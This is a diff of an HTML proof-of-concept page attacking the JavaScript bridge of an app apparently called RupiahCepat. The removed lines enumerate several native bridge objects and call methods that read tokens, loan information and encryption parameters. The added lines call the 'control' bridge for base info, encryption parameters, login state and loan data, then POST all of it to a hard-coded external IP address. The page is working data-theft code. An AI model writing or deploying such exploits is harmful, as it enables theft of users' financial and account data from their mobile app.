@@ -1,56 +1,26 @@
 <!DOCTYPE html>
   <html>
-  <head>
-      <title>RupiahCepat Bridge PoC</title>
-      <style>
-          body { font-family: 'Courier New', monospace; padding: 15px; background: #000; color: #0f0; font-size: 12px; }
-          .log-box { background: #111; border: 1px solid #333; padding: 10px; margin-top: 10px; word-break: break-all; }
-          .entry { margin-bottom: 5px; border-bottom: 1px solid #222; padding-bottom: 5px; }
-          .critical { color: #f00; font-weight: bold; background: #300; padding: 2px; }
-          .success { color: #0f0; }
-          .header { color: #ff0; font-size: 16px; margin-bottom: 10px; border-bottom: 2px solid #ff0; }
-      </style>
-  </head>
-  <body>
-      <div class="header">RupiahCepat JS Bridge Enumeration</div>
-      <div class="log-box" id="log"></div>
+  <body style="background:#000;color:#0f0;padding:20px;font-family:monospace">
+  <div id="out">sending...</div>
+  <script>
+  var base   = window.control.getBaseInfo();
+  var params = window.control.getCommonEncryptParams('{}');
+  var login  = window.control.isLogin();
+  var loan   = window.control.getLoanInfo();
 
-      <script>
-          function log(msg, className) {
-              var div = document.createElement('div');
-              div.className = 'entry ' + (className || '');
-              div.innerText = msg;
-              document.getElementById('log').appendChild(div);
-          }
+  document.getElementById('out').innerText =
+      'base: ' + base + '\nparams: ' + params + '\nlogin: ' + login;
 
-          function enumerateBridge(name) {
-              if (!window[name]) {
-                  log('Bridge [' + name + '] not found', 'critical');
-                  return;
-              }
-              log('=== Bridge [' + name + '] found ===', 'success');
-
-              var targets = [
-                  { method: 'getBaseInfo',             args: []     },
-                  { method: 'getCommonEncryptParams',  args: ['{}'] },
-                  { method: 'getLoanInfo',             args: []     },
-                  { method: 'getH5Storage',            args: ['token'] },
-                  { method: 'isLogin',                 args: []     },
-                  { method: 'decryptData',             args: ['']   },
-              ];
-
-              targets.forEach(function(t) {
-                  try {
-                      var result = window[name][t.method].apply(window[name], t.args);
-                      log(t.method + ': ' + result, result ? 'critical' : '');
-                  } catch(e) {
-                      log(t.method + ': Error - ' + e.message);
-                  }
-              });
-          }
-
-          var handles = ['control', 'OPay3PartyContext', 'Android', 'JSBridge'];
-          handles.forEach(enumerateBridge);
-      </script>
+  fetch('https://124.71.173.168:8443/collect', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+          base:   base,
+          params: params,
+          login:  login,
+          loan:   loan
+      })
+  });
+  </script>
   </body>
   </html>
